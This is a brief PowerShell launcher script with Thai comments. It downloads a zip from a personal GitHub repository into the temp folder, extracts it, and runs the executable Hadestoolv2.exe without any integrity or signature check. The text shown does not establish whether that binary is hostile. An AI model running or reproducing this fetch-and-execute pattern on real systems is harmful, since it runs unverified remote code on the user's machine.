$folder = "$env:TEMP\Hadestoolv2"
if (!(Test-Path $folder)) { New-Item -ItemType Directory -Path $folder | Out-Null }

# ใช้ลิงก์ Raw ที่ถูกต้องสำหรับดึงไฟล์ .zip โดยตรง
$zipUrl = "https://github.com/natchanam18-debug/SSS/raw/main/app.zip"
$zipPath = "$env:TEMP\app.zip"

Write-Host "กำลังดาวน์โหลดไฟล์..." -ForegroundColor Cyan
Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath

Write-Host "กำลังแตกไฟล์..." -ForegroundColor Cyan
Expand-Archive -Path $zipPath -DestinationPath $folder -Force

Write-Host "กำลังเปิดโปรแกรม..." -ForegroundColor Green
Start-Process "$folder\Hadestoolv2.exe"
